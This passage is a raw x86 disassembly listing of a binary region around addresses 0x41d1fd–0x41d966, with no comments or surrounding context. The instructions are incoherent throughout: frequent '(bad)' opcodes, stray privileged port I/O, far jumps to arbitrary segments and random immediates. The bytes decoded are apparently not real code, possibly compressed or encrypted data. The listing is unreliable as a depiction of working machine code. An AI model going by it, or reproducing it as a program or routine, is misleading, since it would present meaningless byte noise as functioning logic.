  41d1fd:	add    BYTE PTR [ebx+0x65],cl
  41d200:	div    DWORD PTR [esp+edi*4]
  41d203:	(bad)  
  41d204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d205:	xchg   ebx,eax
  41d206:	push   cs
  41d207:	jmp    0x41d192
  41d209:	loope  0x41d1b5
  41d20b:	mov    esi,0xcad98d11
  41d210:	ds adc eax,0xb7665bbb
  41d216:	call   0x8ec6:0x90088618
  41d21d:	xchg   esi,eax
  41d21e:	push   ecx
  41d21f:	cmp    BYTE PTR [eax],ch
  41d221:	mov    ebx,0x13131605
  41d226:	bound  esp,QWORD PTR [edx]
  41d228:	shr    BYTE PTR [edi+0xa9e30ac],0x4a
  41d22f:	push   esp
  41d230:	mov    edi,0x4915cafb
  41d235:	das    
  41d236:	and    eax,0x2673fdbc
  41d23b:	or     edx,DWORD PTR [ebp+0x5]
  41d23e:	and    edx,DWORD PTR [eax+0x27f6b670]
  41d244:	xor    al,0x49
  41d246:	xchg   DWORD PTR [ebx],ebp
  41d248:	add    DWORD PTR [esp+eiz*8],ecx
  41d24b:	pop    es
  41d24c:	in     al,dx
  41d24d:	xor    BYTE PTR [edi-0x60],al
  41d250:	jp     0x41d1e3
  41d252:	push   ss
  41d253:	ror    BYTE PTR [esi],0x26
  41d256:	cli    
  41d257:	push   si
  41d259:	sub    DWORD PTR [ebx],edi
  41d25b:	mov    ecx,0xc94325b0
  41d260:	lahf   
  41d261:	sub    cl,0x1
  41d264:	jge    0x41d1ea
  41d266:	cdq    
  41d267:	mov    dh,0x61
  41d269:	aaa    
  41d26a:	jo     0x41d1ef
  41d26c:	mov    ds:0x17cabd6a,al
  41d271:	ret    0x6859
  41d274:	push   ebx
  41d275:	ret    
  41d276:	inc    esp
  41d277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d278:	and    DWORD PTR [ecx],edx
  41d27a:	xchg   esi,eax
  41d27b:	pop    ds
  41d27c:	ret    0x4301
  41d27f:	int    0x61
  41d281:	sti    
  41d282:	popf   
  41d283:	xlat   BYTE PTR ds:[ebx]
  41d284:	jg     0x41d291
  41d286:	inc    BYTE PTR [esi-0x5d]
  41d289:	cmp    ch,BYTE PTR [eax]
  41d28b:	xor    al,0x93
  41d28d:	cmp    ecx,DWORD PTR [ebx+0x3c]
  41d290:	adc    al,BYTE PTR [esi]
  41d292:	faddp  st(7),st
  41d294:	xlat   BYTE PTR ds:[ebx]
  41d295:	xor    al,0x0
  41d297:	sub    esi,DWORD PTR [ecx]
  41d299:	(bad)  
  41d29b:	or     BYTE PTR [ecx+0x60988488],bl
  41d2a1:	xor    al,0xe1
  41d2a3:	mov    ebx,0x1975ff2d
  41d2a8:	xlat   BYTE PTR ds:[ebx]
  41d2a9:	ss (bad) 
  41d2ab:	out    dx,eax
  41d2ac:	enter  0xdd53,0xb9
  41d2b0:	jle    0x41d27c
  41d2b2:	pop    ebp
  41d2b3:	enter  0xe2df,0xf
  41d2b7:	mov    al,ds:0x9454bda2
  41d2bc:	mov    ds,WORD PTR [edi-0x4e]
  41d2bf:	fcmovnb st,st(0)
  41d2c1:	or     ebp,DWORD PTR [edx]
  41d2c3:	sub    al,0xe9
  41d2c5:	loopne 0x41d328
  41d2c7:	lea    ecx,[ebp-0x1e]
  41d2ca:	sub    dl,BYTE PTR [eax]
  41d2cc:	ret    0xedf1
  41d2cf:	jmp    0x781c:0x54d4e23b
  41d2d6:	xor    ah,BYTE PTR cs:[eax-0xc]
  41d2da:	out    dx,eax
  41d2db:	jmp    0x99c046cf
  41d2e0:	imul   ebx,DWORD PTR [esi+0x3ace0143],0x3e
  41d2e7:	popa   
  41d2e8:	mov    ds:0x58b3710d,eax
  41d2ed:	outs   dx,BYTE PTR ds:[esi]
  41d2ee:	adc    al,0x87
  41d2f0:	(bad)  
  41d2f1:	stc    
  41d2f2:	leave  
  41d2f3:	lods   al,BYTE PTR ds:[esi]
  41d2f4:	mov    ss,WORD PTR [ecx-0x75]
  41d2f7:	cmp    DWORD PTR [edx-0x1c],esp
  41d2fa:	pop    esi
  41d2fb:	enter  0x9215,0x4d
  41d2ff:	jbe    0x41d302
  41d301:	mov    ds:0x9e46ca63,al
  41d306:	mov    ah,0x68
  41d308:	xor    BYTE PTR [eax+0x6c10b76b],dl
  41d30e:	repz (bad) 
  41d311:	push   esi
  41d312:	lds    eax,FWORD PTR [esi]
  41d314:	cmp    DWORD PTR [ecx+0x19d94877],ebp
  41d31a:	lds    eax,FWORD PTR [edx+0x67]
  41d31d:	int    0x1
  41d31f:	cli    
  41d320:	add    BYTE PTR [ecx-0x1ee666db],ah
  41d326:	test   esp,ecx
  41d328:	jnp    0x41d2c5
  41d32a:	xchg   edx,eax
  41d32b:	inc    ebp
  41d32c:	jmp    0x41d35e
  41d32e:	xor    eax,0x116b5bab
  41d333:	aas    
  41d334:	jo     0x41d338
  41d336:	dec    ebp
  41d337:	retf   0xd4f0
  41d33a:	mov    ebx,0xe33f7561
  41d33f:	(bad)  
  41d340:	retf   
  41d341:	and    al,0xc2
  41d343:	pop    ecx
  41d344:	xor    DWORD PTR [ebp+0x53],edi
  41d347:	jmp    0xff54:0xa4aca81a
  41d34e:	sub    eax,0x375b1d26
  41d353:	popa   
  41d354:	mov    eax,0x5c7fad7
  41d359:	sbb    eax,0x1429a056
  41d35e:	mov    ds:0x710c02b4,eax
  41d363:	out    0xcb,eax
  41d365:	and    BYTE PTR [edx-0x754ccad5],0xe4
  41d36c:	es jnp 0x41d33b
  41d36f:	adc    ah,ah
  41d371:	pop    ecx
  41d372:	and    al,BYTE PTR [edx]
  41d374:	mov    WORD PTR [edi],?
  41d376:	rcr    DWORD PTR [esi],0x10
  41d379:	add    al,0x10
  41d37b:	shl    BYTE PTR [ebx+esi*1+0x1a3f29f9],0x13
  41d383:	cs ret 
  41d385:	push   edx
  41d386:	dec    ebp
  41d387:	push   esp
  41d388:	xor    BYTE PTR [esi+eiz*8],ch
  41d38b:	jle    0x41d3e6
  41d38d:	ins    BYTE PTR es:[edi],dx
  41d38e:	mov    eax,es
  41d390:	mov    esi,0xb32625ff
  41d395:	repz push ecx
  41d397:	sub    al,0xaf
  41d399:	pop    edi
  41d39a:	pop    ebx
  41d39b:	int3   
  41d39c:	(bad)  
  41d39d:	imul   esp,DWORD PTR [esp+ecx*1],0xffffffe2
  41d3a1:	xor    DWORD PTR [esi+0x6f],0xffffffa1
  41d3a5:	sub    ah,dh
  41d3a7:	rol    BYTE PTR [edi+ebp*8+0x78b786c2],cl
  41d3ae:	cwde   
  41d3af:	pop    ebp
  41d3b0:	jp     0x41d3f0
  41d3b2:	imul   esi,DWORD PTR [esp+ebx*8+0x1d],0x3d
  41d3b7:	inc    eax
  41d3b8:	cmp    al,0xf7
  41d3ba:	lahf   
  41d3bb:	sub    al,0x93
  41d3bd:	and    eax,0x326be60
  41d3c2:	push   eax
  41d3c3:	and    al,0x83
  41d3c5:	dec    ecx
  41d3c6:	clc    
  41d3c7:	xchg   esi,eax
  41d3c8:	retf   
  41d3c9:	mov    esp,0x3325f572
  41d3ce:	cmc    
  41d3cf:	imul   esi,DWORD PTR [eax+ebp*2],0x16
  41d3d3:	add    al,0x32
  41d3d5:	iret   
  41d3d6:	mov    ds:0x95e7dbf6,al
  41d3db:	mov    edi,0x9908ec2c
  41d3e0:	mov    bl,0x9d
  41d3e2:	popa   
  41d3e3:	ins    BYTE PTR es:[edi],dx
  41d3e4:	push   eax
  41d3e5:	add    eax,0xf303f1a4
  41d3ea:	stos   DWORD PTR es:[edi],eax
  41d3eb:	dec    ebp
  41d3ec:	dec    edi
  41d3ed:	in     eax,dx
  41d3ee:	mov    al,0x6f
  41d3f0:	ins    DWORD PTR es:[edi],dx
  41d3f1:	push   0xffffffce
  41d3f3:	add    BYTE PTR [ecx],cl
  41d3f5:	in     al,dx
  41d3f6:	retf   
  41d3f7:	fnstenv [ecx-0x49]
  41d3fa:	call   0xc2fa:0xed02e60
  41d401:	fisub  DWORD PTR [esp+edi*1+0x270c9b50]
  41d408:	clc    
  41d409:	sbb    BYTE PTR [edx],dh
  41d40b:	out    0xc4,al
  41d40d:	xchg   si,ax
  41d40f:	sub    dh,bl
  41d411:	xlat   BYTE PTR ds:[ebx]
  41d412:	popa   
  41d413:	sbb    DWORD PTR [eax+edi*2-0xb],0xffffffe7
  41d418:	jne    0x41d3e2
  41d41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d41b:	lock xchg edi,eax
  41d41d:	mov    edi,0x490cc428
  41d422:	mov    al,0x93
  41d424:	mov    dh,0x8c
  41d426:	push   esp
  41d427:	int    0xa9
  41d429:	out    dx,al
  41d42a:	(bad)  
  41d42b:	pop    edx
  41d42c:	mov    cl,0xa1
  41d42e:	mov    eax,ds:0x38fa3a3c
  41d433:	cdq    
  41d434:	jmp    DWORD PTR [edx-0x48]
  41d437:	pop    edi
  41d438:	mov    ds:0x1a6c1e18,eax
  41d43d:	pop    edx
  41d43e:	loope  0x41d3c6
  41d440:	mov    DWORD PTR [esi],ecx
  41d442:	(bad)  [edx]
  41d444:	and    esp,ecx
  41d446:	jns    0x41d4c2
  41d448:	mov    ds:0xb5ea6634,al
  41d44d:	pop    ss
  41d44e:	ror    BYTE PTR [ebp-0xf],1
  41d451:	ins    DWORD PTR es:[edi],dx
  41d452:	psubsb mm2,mm5
  41d455:	push   ss
  41d456:	gs push eax
  41d458:	add    eax,0xbffddddc
  41d45d:	or     eax,0xd3d5758d
  41d462:	arpl   WORD PTR [eax],dx
  41d464:	and    dh,cl
  41d466:	(bad)  
  41d467:	adc    DWORD PTR [edx-0x2262764a],esi
  41d46d:	test   BYTE PTR [esi+0x7d],dl
  41d470:	cmp    eax,0xab5b21a
  41d475:	adc    eax,DWORD PTR [edx-0x51d092e0]
  41d47b:	fldenv [ebx+0x10]
  41d47e:	dec    BYTE PTR [ebx-0x28]
  41d481:	outs   dx,BYTE PTR ds:[esi]
  41d482:	xchg   ebp,eax
  41d483:	inc    edx
  41d484:	jle    0x41d4f2
  41d486:	push   ss
  41d487:	aad    0xa1
  41d489:	xchg   ebx,eax
  41d48a:	sti    
  41d48b:	pop    ebx
  41d48c:	cmp    al,0x2
  41d48e:	cwde   
  41d48f:	add    eax,0x69d10263
  41d494:	xchg   ebx,eax
  41d495:	fs aas 
  41d497:	sub    BYTE PTR [ecx+0x1d59635a],0x4f
  41d49e:	mov    dl,0xf3
  41d4a0:	cmp    bh,BYTE PTR [edx]
  41d4a2:	ror    dh,0x93
  41d4a5:	mov    ch,0x3a
  41d4a7:	mov    ah,0x66
  41d4a9:	pop    ecx
  41d4aa:	test   ch,al
  41d4ac:	mov    WORD PTR [ebp+0x2790f9ac],?
  41d4b2:	mov    eax,ds:0xfbed8fb5
  41d4b7:	stc    
  41d4b8:	repnz mov ss,WORD PTR [ecx+0x40]
  41d4bc:	fsubr  DWORD PTR [edx-0x18]
  41d4bf:	adc    BYTE PTR [eax+0x2a516651],bh
  41d4c5:	adc    BYTE PTR [edx+0x7b842644],dl
  41d4cb:	mov    ebp,0x38c66826
  41d4d0:	lock mov fs,WORD PTR [edx-0x57]
  41d4d4:	cmc    
  41d4d5:	ret    0x3307
  41d4d8:	enter  0xbd7a,0x9a
  41d4dc:	xchg   ebx,eax
  41d4dd:	(bad)  
  41d4df:	xchg   ecx,eax
  41d4e0:	iret   
  41d4e1:	(bad)
  41d4e4:	fst    DWORD PTR [ebx-0x30bb3b1e]
  41d4ea:	sub    al,0xcb
  41d4ec:	pusha  
  41d4ed:	push   esp
  41d4ee:	adc    esp,ebp
  41d4f0:	sub    eax,0x6b0ed34f
  41d4f5:	dec    edi
  41d4f6:	inc    edx
  41d4f7:	dec    edx
  41d4f8:	sbb    eax,0x8e6488f8
  41d4fd:	and    al,0xc2
  41d4ff:	cs fwait
  41d501:	jo     0x41d4de
  41d503:	push   0x54
  41d505:	rol    BYTE PTR [edx-0x6b4352a1],cl
  41d50b:	pushf  
  41d50c:	jbe    0x41d4e5
  41d50e:	adc    ebp,esi
  41d510:	push   ds
  41d511:	(bad)  
  41d513:	popf   
  41d514:	jl     0x41d55e
  41d516:	sti    
  41d517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d518:	int3   
  41d519:	dec    ebp
  41d51a:	lods   eax,DWORD PTR ds:[esi]
  41d51b:	adc    al,0x2d
  41d51d:	cmp    BYTE PTR [esi-0x1a],ah
  41d520:	loop   0x41d58a
  41d522:	ins    BYTE PTR es:[edi],dx
  41d523:	int3   
  41d524:	pop    ss
  41d525:	inc    ecx
  41d526:	lods   al,BYTE PTR ds:[esi]
  41d527:	in     al,0xa0
  41d529:	push   ebx
  41d52a:	pop    ss
  41d52b:	or     cl,BYTE PTR [ecx]
  41d52d:	(bad)  
  41d52e:	pushf  
  41d52f:	sbb    eax,0xac280975
  41d534:	pop    esp
  41d535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d536:	in     eax,0x37
  41d538:	sub    DWORD PTR cs:0xb65e6d17,esp
  41d53f:	mov    edx,ss
  41d541:	inc    ecx
  41d542:	mov    ch,BYTE PTR [edi+0x735f0fa1]
  41d548:	cmp    BYTE PTR [edx-0xd557091],cl
  41d54e:	xchg   edi,eax
  41d54f:	jmp    0x7c8eb6a6
  41d554:	inc    esi
  41d555:	out    0xf1,al
  41d557:	mov    edi,0x42d17e27
  41d55c:	cmp    edx,DWORD PTR [edx]
  41d55e:	das    
  41d55f:	inc    ebx
  41d560:	iret   
  41d561:	cld    
  41d562:	xor    BYTE PTR [esp+ebx*4-0x6a6c3140],0x5e
  41d56a:	inc    esp
  41d56b:	(bad)  
  41d56c:	fstp   QWORD PTR [ecx-0x478841b9]
  41d572:	into   
  41d573:	jge    0x41d5f0
  41d575:	call   FWORD PTR [edi]
  41d577:	fiadd  WORD PTR [esi+edx*4-0x41]
  41d57b:	sbb    ebp,ebx
  41d57d:	mov    cl,0xaf
  41d57f:	out    0xb,al
  41d581:	je     0x41d52a
  41d583:	pop    es
  41d584:	adc    al,0xc8
  41d586:	fsub   DWORD PTR [ebp+edi*8+0x3fec1f53]
  41d58d:	inc    ebx
  41d58e:	jbe    0x41d53d
  41d590:	clc    
  41d591:	test   eax,0x8974f300
  41d596:	cli    
  41d597:	jno    0x41d550
  41d599:	fisttp DWORD PTR [ebx]
  41d59b:	cmp    dh,BYTE PTR [eax]
  41d59d:	xor    ebx,ebx
  41d59f:	bound  ecx,QWORD PTR ds:0x1f5dd1c5
  41d5a5:	bnd jo 0x41d540
  41d5a8:	sbb    ah,BYTE PTR ds:[edx+0x49]
  41d5ac:	stc    
  41d5ad:	inc    edx
  41d5ae:	dec    ecx
  41d5af:	push   0xf90eb973
  41d5b4:	cmovne esi,DWORD PTR [ecx+0x1b]
  41d5b8:	cmp    edx,ecx
  41d5ba:	inc    ebx
  41d5bb:	and    ch,BYTE PTR [edi]
  41d5bd:	dec    ebp
  41d5be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5bf:	xchg   esp,eax
  41d5c0:	mov    bl,0x56
  41d5c2:	cli    
  41d5c3:	fwait
  41d5c4:	pop    ss
  41d5c5:	fst    DWORD PTR [ebx+0x5ebf7d0]
  41d5cb:	fcmovne st,st(2)
  41d5cd:	or     eax,0xb5739784
  41d5d2:	cdq    
  41d5d3:	aaa    
  41d5d4:	pop    ebp
  41d5d5:	out    0x52,al
  41d5d7:	pop    eax
  41d5d8:	pop    ss
  41d5d9:	mov    bh,0x34
  41d5db:	es xor eax,0x722a08c1
  41d5e1:	xor    al,0x10
  41d5e3:	xchg   ecx,eax
  41d5e4:	xlat   BYTE PTR ds:[ebx]
  41d5e5:	inc    esp
  41d5e6:	(bad)  
  41d5e9:	or     al,0xc8
  41d5eb:	stos   BYTE PTR es:[edi],al
  41d5ec:	clc    
  41d5ed:	xchg   ebp,eax
  41d5ee:	add    eax,0xdbd88d6
  41d5f3:	arpl   WORD PTR [ecx],bx
  41d5f5:	cli    
  41d5f6:	xor    edi,DWORD PTR [eax+0xaeaebcd]
  41d5fc:	out    dx,eax
  41d5fd:	leave  
  41d5fe:	mov    ecx,0xa148a47
  41d603:	jns    0x41d62f
  41d605:	cmp    esi,esp
  41d607:	mov    eax,0x11aeb84d
  41d60c:	and    dl,BYTE PTR [eax]
  41d60e:	push   edx
  41d60f:	ss addr16 test eax,0x73d2dc87
  41d616:	xor    BYTE PTR [ecx],bl
  41d618:	cld    
  41d619:	ror    dh,0x7a
  41d61c:	xor    ebp,DWORD PTR [ecx+0x24d4bf7f]
  41d622:	retf   
  41d623:	call   FWORD PTR [ecx-0x6562ab44]
  41d629:	push   0x4d
  41d62b:	enter  0x3852,0x98
  41d62f:	dec    ebx
  41d630:	inc    ebx
  41d631:	sbb    esi,DWORD PTR [edi]
  41d633:	push   ebx
  41d634:	daa    
  41d635:	sub    DWORD PTR [esi+0x49d66926],edx
  41d63b:	pop    ebp
  41d63c:	bound  ecx,QWORD PTR [edi]
  41d63e:	daa    
  41d63f:	cmc    
  41d640:	mov    dl,0x97
  41d642:	fs int3 
  41d644:	mov    gs,WORD PTR [ebp+0x79]
  41d647:	pop    eax
  41d648:	adc    eax,0xf1c2616f
  41d64d:	mov    eax,0x75b38446
  41d652:	stos   DWORD PTR es:[edi],eax
  41d653:	fs pop ds
  41d655:	into   
  41d656:	inc    ebp
  41d657:	lds    ebp,FWORD PTR ds:0xcc06372b
  41d65d:	mov    bl,0x78
  41d65f:	ja     0x41d6a0
  41d661:	mov    edx,edi
  41d663:	xor    ebx,DWORD PTR [eax]
  41d665:	mov    bl,0x30
  41d667:	mov    edi,0xf7ee2606
  41d66c:	jmp    0xb3a0f319
  41d671:	test   DWORD PTR [edx+0x59],0xf19d6a31
  41d678:	(bad)  
  41d679:	lock push ds
  41d67b:	add    BYTE PTR [ebx],0x0
  41d67e:	or     esi,ebp
  41d680:	inc    esi
  41d681:	dec    esi
  41d682:	or     ah,BYTE PTR [edx+0x3f]
  41d685:	pop    eax
  41d686:	(bad)  
  41d687:	jmp    0xc2d46193
  41d68c:	push   eax
  41d68d:	test   bl,cl
  41d68f:	sbb    bh,0x4b
  41d692:	push   ss
  41d693:	sbb    eax,0x2d6260b0
  41d698:	aad    0x1c
  41d69a:	pusha  
  41d69b:	neg    BYTE PTR [esi]
  41d69d:	xchg   ebx,eax
  41d69e:	fs ret 0x7a6a
  41d6a2:	mov    ebp,0xd14ecbf
  41d6a7:	icebp  
  41d6a8:	lds    edi,FWORD PTR [eax]
  41d6aa:	or     edx,DWORD PTR gs:[ebx]
  41d6ad:	es adc eax,0x2ec01b39
  41d6b3:	jo     0x41d642
  41d6b5:	mov    edx,0x3c039e6
  41d6ba:	pop    ss
  41d6bb:	daa    
  41d6bc:	push   ds
  41d6bd:	mov    ah,0xc6
  41d6bf:	sbb    al,0xf5
  41d6c1:	fwait
  41d6c2:	rcr    dh,1
  41d6c4:	mov    ecx,0x89389960
  41d6c9:	test   ch,al
  41d6cb:	mov    dh,BYTE PTR [edi]
  41d6cd:	xor    esi,DWORD PTR [edx+0x66a2a8c3]
  41d6d3:	add    ch,BYTE PTR [ecx-0x7]
  41d6d6:	in     al,dx
  41d6d7:	outs   dx,DWORD PTR ds:[esi]
  41d6d8:	(bad)  
  41d6d9:	rcl    DWORD PTR [esp+ebp*4-0x661937bd],1
  41d6e0:	aas    
  41d6e1:	sub    dl,dh
  41d6e3:	mov    dl,0x1b
  41d6e5:	sar    BYTE PTR [edx+0x451a97e2],cl
  41d6eb:	int    0x54
  41d6ed:	test   eax,0xe82c0470
  41d6f2:	mov    ds:0xe0f896a5,eax
  41d6f7:	pop    esp
  41d6f8:	lock jmp ebp
  41d6fb:	test   al,0xf2
  41d6fd:	mov    esp,0x649bbf1f
  41d702:	mov    ch,0x40
  41d704:	loope  0x41d68e
  41d706:	push   0x23
  41d708:	xchg   ecx,eax
  41d709:	test   eax,0xa955d47f
  41d70e:	lods   al,BYTE PTR ds:[esi]
  41d70f:	bound  esi,QWORD PTR [eax]
  41d711:	gs and esp,edx
  41d714:	das    
  41d715:	inc    edi
  41d716:	cmp    bh,al
  41d718:	dec    ecx
  41d719:	mov    esi,0xf88e5e5b
  41d71e:	(bad)  
  41d71f:	std    
  41d720:	jnp    0x41d775
  41d722:	mov    ecx,DWORD PTR ds:0x2a8dfa4a
  41d728:	or     al,BYTE PTR [edi+0x3b]
  41d72b:	cld    
  41d72c:	inc    edx
  41d72d:	xor    al,0x62
  41d72f:	neg    DWORD PTR [eax+0x4a]
  41d732:	or     dh,dl
  41d734:	shl    DWORD PTR [eax-0x71],0xa1
  41d738:	sti    
  41d739:	dec    ebp
  41d73a:	xor    al,0x37
  41d73c:	ja     0x41d748
  41d73e:	lds    ebp,FWORD PTR [edx]
  41d740:	div    BYTE PTR [edi-0x1fb0918c]
  41d746:	mov    al,ds:0xde65cc73
  41d74b:	into   
  41d74c:	(bad)  
  41d74d:	aad    0xeb
  41d74f:	dec    esi
  41d750:	pop    edx
  41d751:	aam    0xf1
  41d753:	dec    edx
  41d754:	jno    0x41d7c2
  41d756:	(bad)  
  41d757:	sub    al,0x33
  41d759:	fwait
  41d75a:	add    dl,BYTE PTR [ecx-0x298b1f40]
  41d760:	or     DWORD PTR [edi*2+0x18a39177],ebp
  41d767:	stos   DWORD PTR es:[edi],eax
  41d768:	ja     0x41d79a
  41d76a:	cwde   
  41d76b:	icebp  
  41d76c:	mov    WORD PTR [ecx-0x4edc04c0],cs
  41d772:	jl     0x41d6f4
  41d774:	loope  0x41d7d6
  41d776:	inc    esp
  41d777:	inc    BYTE PTR [eax+0x34]
  41d77a:	stos   BYTE PTR es:[edi],al
  41d77b:	stos   DWORD PTR es:[edi],eax
  41d77c:	pop    eax
  41d77d:	mov    dh,0x1e
  41d77f:	into   
  41d780:	scas   eax,DWORD PTR es:[edi]
  41d781:	neg    BYTE PTR [edi+0x39bf1409]
  41d787:	push   ss
  41d788:	aas    
  41d789:	mov    ecx,0x94822978
  41d78e:	cmp    ecx,DWORD PTR [ebx-0x6d]
  41d791:	ret    0xcb37
  41d794:	cmp    eax,0x693d4cfd
  41d799:	dec    ebp
  41d79a:	popa   
  41d79b:	pop    esp
  41d79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d79d:	sbb    eax,0x575f99f7
  41d7a2:	mov    bh,0xf3
  41d7a4:	test   eax,0x40597033
  41d7a9:	pop    edx
  41d7aa:	inc    sp
  41d7ac:	adc    cl,BYTE PTR [ebp-0x14]
  41d7af:	add    ebx,DWORD PTR ds:0x8c161261
  41d7b5:	sbb    ah,BYTE PTR [esi*4+0x7f49bcbd]
  41d7bc:	push   edx
  41d7bd:	pop    DWORD PTR [edi]
  41d7bf:	adc    BYTE PTR [eax+0x3170ab2a],al
  41d7c5:	pop    eax
  41d7c6:	push   esp
  41d7c7:	add    dh,ch
  41d7c9:	hlt    
  41d7ca:	ins    BYTE PTR es:[edi],dx
  41d7cb:	adc    bh,al
  41d7cd:	je     0x41d762
  41d7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7d0:	mov    edx,0xf3494c9e
  41d7d5:	enter  0xd183,0xfb
  41d7d9:	or     ebp,edi
  41d7db:	sahf   
  41d7dc:	call   0xf29685ce
  41d7e1:	repnz inc eax
  41d7e3:	mov    ebp,0xdc961754
  41d7e8:	mov    eax,ds:0xa64644ac
  41d7ed:	inc    eax
  41d7ee:	dec    eax
  41d7ef:	leave  
  41d7f0:	xor    al,0x2c
  41d7f2:	imul   edi,DWORD PTR [edi],0x7c
  41d7f5:	mov    ds:0x2772364e,eax
  41d7fa:	or     dl,BYTE PTR [ebx+ecx*2+0x55]
  41d7fe:	enter  0xc200,0x92
  41d802:	xchg   esi,eax
  41d803:	jb     0x41d86d
  41d805:	sar    BYTE PTR [ebx],0xe2
  41d808:	ja     0x41d802
  41d80a:	add    ebp,ebx
  41d80c:	outs   dx,DWORD PTR ds:[esi]
  41d80d:	mov    bl,BYTE PTR [ebx+ebx*2-0x71ffe15]
  41d814:	test   edi,eax
  41d816:	and    DWORD PTR [edx],ebx
  41d818:	addr16 loop 0x41d886
  41d81b:	sbb    bl,BYTE PTR [eax]
  41d81d:	int3   
  41d81e:	mov    ebp,0x5ba315e8
  41d823:	fnstcw WORD PTR [edx+0x4577317b]
  41d829:	test   DWORD PTR [ebx+0xbdcdf12],0x8a4a6e07
  41d833:	pop    ecx
  41d834:	adc    dl,ah
  41d836:	cmp    edi,DWORD PTR [esi]
  41d838:	pop    ecx
  41d839:	out    0x7,eax
  41d83b:	rcr    DWORD PTR [bx],cl
  41d83e:	xchg   ebx,ebx
  41d840:	jle    0x41d876
  41d842:	ror    BYTE PTR [edx],cl
  41d844:	aas    
  41d845:	add    eax,edi
  41d847:	push   esp
  41d848:	das    
  41d849:	test   BYTE PTR ds:0xef7d009a,al
  41d84f:	fild   DWORD PTR [eax]
  41d851:	xor    al,BYTE PTR [edx]
  41d853:	mov    esi,0x38f022c0
  41d858:	pop    ss
  41d859:	out    dx,eax
  41d85a:	xor    eax,0xe386a9d4
  41d85f:	mov    bh,0x25
  41d861:	mov    al,ds:0x5763beca
  41d866:	cld    
  41d867:	stos   DWORD PTR es:[edi],eax
  41d868:	jbe    0x41d83c
  41d86a:	sahf   
  41d86b:	mov    cl,0xc1
  41d86d:	mov    edi,0x870c6ed6
  41d872:	jae    0x41d803
  41d874:	and    cl,BYTE PTR [esi-0xc]
  41d877:	sahf   
  41d878:	pop    esp
  41d879:	xchg   edx,eax
  41d87a:	(bad)  
  41d87b:	or     eax,0xfed38b41
  41d880:	jne    0x41d82d
  41d882:	sti    
  41d883:	lock mov esi,0xbbf63d75
  41d889:	out    0xbc,al
  41d88b:	ret    
  41d88c:	dec    edx
  41d88d:	pop    ecx
  41d88e:	xchg   edi,eax
  41d88f:	sub    al,0xba
  41d891:	and    DWORD PTR [edx-0x6818d575],0x3c560889
  41d89b:	mov    ah,0xfe
  41d89d:	sub    ecx,DWORD PTR [eax+edx*1+0x7cd37805]
  41d8a4:	or     dh,BYTE PTR [edi]
  41d8a6:	mov    BYTE PTR [esi+0x7b],al
  41d8a9:	jns    0x41d8d2
  41d8ab:	push   esp
  41d8ac:	hlt    
  41d8ad:	or     edx,DWORD PTR [ebx-0x7182998b]
  41d8b3:	(bad)  
  41d8b4:	imul   DWORD PTR [edi-0x6b9c5945]
  41d8ba:	push   esi
  41d8bb:	ror    DWORD PTR [ebx],1
  41d8bd:	in     al,0xb5
  41d8bf:	and    edx,eax
  41d8c1:	dec    esp
  41d8c2:	push   ebx
  41d8c3:	xchg   esi,eax
  41d8c4:	xchg   edx,eax
  41d8c5:	mov    esi,0x7688030b
  41d8ca:	into   
  41d8cb:	pop    esi
  41d8cc:	in     eax,dx
  41d8cd:	div    DWORD PTR [edi]
  41d8cf:	mov    ebx,0x27e270ae
  41d8d4:	(bad)  
  41d8d5:	out    0xb4,eax
  41d8d7:	dec    eax
  41d8d8:	mov    al,ds:0xa4992c5c
  41d8dd:	cmp    eax,0x7574c569
  41d8e2:	gs mov bh,0x58
  41d8e5:	push   es
  41d8e6:	cmp    BYTE PTR [ebx+ebp*2],bh
  41d8e9:	mov    edi,0x4f5d6188
  41d8ee:	(bad)  
  41d8ef:	adc    ebx,DWORD PTR [ebx+esi*1+0x44]
  41d8f3:	dec    esi
  41d8f4:	imul   edi,DWORD PTR [ebp-0x2f],0x9f95eeac
  41d8fb:	ss push ebx
  41d8fd:	lahf   
  41d8fe:	(bad)  [eax+0x3e25434d]
  41d904:	repnz loop 0x41d8ee
  41d907:	lods   eax,DWORD PTR ds:[esi]
  41d908:	gs pop ecx
  41d90a:	maskmovq mm3,(bad)
  41d90b:	neg    DWORD PTR [ebp+0x398e8047]
  41d911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d912:	xor    ebp,edi
  41d914:	loop   0x41d8b2
  41d916:	stos   BYTE PTR es:[edi],al
  41d917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d918:	push   ds
  41d919:	jmp    0x6a30:0xe003c5ea
  41d920:	adc    ebx,edx
  41d922:	jmp    0x41d921
  41d924:	lods   al,BYTE PTR ds:[esi]
  41d925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d926:	jns    0x41d996
  41d928:	retf   
  41d929:	iret   
  41d92a:	cli    
  41d92b:	jmp    0x158cfefa
  41d930:	push   ss
  41d931:	xor    bh,BYTE PTR [esi]
  41d933:	in     al,0x8e
  41d935:	mov    ah,0x3e
  41d937:	sub    ch,BYTE PTR [edx]
  41d939:	mov    bh,0xe8
  41d93b:	cmc    
  41d93c:	ins    BYTE PTR es:[edi],dx
  41d93d:	call   DWORD PTR [ebx]
  41d93f:	jbe    0x41d93a
  41d941:	(bad)  
  41d942:	and    BYTE PTR [esi],cl
  41d944:	retf   
  41d945:	out    dx,eax
  41d946:	xchg   esp,eax
  41d947:	pop    ss
  41d948:	test   dl,ah
  41d94a:	popa   
  41d94b:	stos   BYTE PTR es:[edi],al
  41d94c:	and    eax,0x957d0efb
  41d951:	retf   
  41d952:	repnz dec esi
  41d954:	lock scas eax,DWORD PTR es:[edi]
  41d956:	icebp  
  41d957:	in     al,dx
  41d958:	cmc    
  41d959:	pusha  
  41d95a:	aas    
  41d95b:	in     al,0x24
  41d95d:	xchg   esi,eax
  41d95e:	pop    esp
  41d95f:	pop    ds
  41d960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d961:	lods   al,BYTE PTR ds:[esi]
  41d962:	retf   
  41d963:	xor    BYTE PTR [eax],dl
  41d965:	push   esp
  41d966:	pop    ebx
